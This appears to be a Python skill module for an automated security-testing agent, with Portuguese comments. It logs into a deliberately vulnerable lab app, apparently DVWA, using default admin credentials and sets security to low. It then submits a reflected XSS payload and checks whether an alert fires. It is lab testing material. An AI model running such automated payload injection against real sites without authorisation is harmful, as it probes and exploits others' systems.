# agent/src/skills/xss_reflected_low.py

from ..tools.browser import Browser
from pathlib import Path

def run(base_url: str, payload: str = '<script>alert("reflected")</script>') -> dict:
    with Browser(base_url) as b:
        # login
        b.goto("/login.php")
        b.page.wait_for_selector('input[name="username"]', timeout=15000)
        b.fill('input[name="username"]', "admin")
        b.fill('input[name="password"]', "password")
        b.click('input[type="submit"]')
        b.page.wait_for_load_state("domcontentloaded")

        # security = low (tentativa best-effort)
        try:
            b.goto("/security.php")
            b.page.wait_for_selector('select[name="security"]', timeout=5000)
            b.page.select_option('select[name="security"]', 'low')
            b.click('input[type="submit"]')
            b.page.wait_for_load_state("domcontentloaded")
        except Exception:
            pass

        # ir para XSS Reflected
        b.goto("/vulnerabilities/xss_r/")
        b.page.wait_for_selector('input[name="name"]', timeout=15000)

        # hook p/ capturar alert()
        alert_triggered = {"ok": False, "message": ""}
        def on_dialog(d):
            alert_triggered["ok"] = True
            alert_triggered["message"] = d.message
            d.accept()
        b.page.on("dialog", on_dialog)

        # enviar payload
        b.fill('input[name="name"]', payload)
        b.click('input[type="submit"]')
        b.page.wait_for_timeout(1200)

        # salvar screenshot
        agent_dir = Path(__file__).resolve().parents[2]
        screens_dir = agent_dir.parent / "screens"
        screens_dir.mkdir(parents=True, exist_ok=True)
        screenshot_path = screens_dir / "xss_reflected_low.png"
        b.page.screenshot(path=str(screenshot_path), full_page=True)

        # analisar sucesso
        html = b.content()
        raw_present = "<script" in html and "alert(" in html
        escaped_present = "&lt;script" in html or "&lt;script&gt;" in html
        ok = alert_triggered["ok"] or raw_present
        reason = (
            f'alert() fired: "{alert_triggered["message"]}"' if alert_triggered["ok"]
            else ("raw <script> in response" if raw_present
                  else ("payload escaped (provável nível > Low)" if escaped_present
                        else "payload não refletido"))
        )

        return {
            "ok": ok,
            "vector": "Reflected XSS (Low)",
            "payload": payload,
            "reason": reason,
            "evidence_contains": (payload if raw_present else html[:1200]),
            "screenshot": str(screenshot_path)
        }
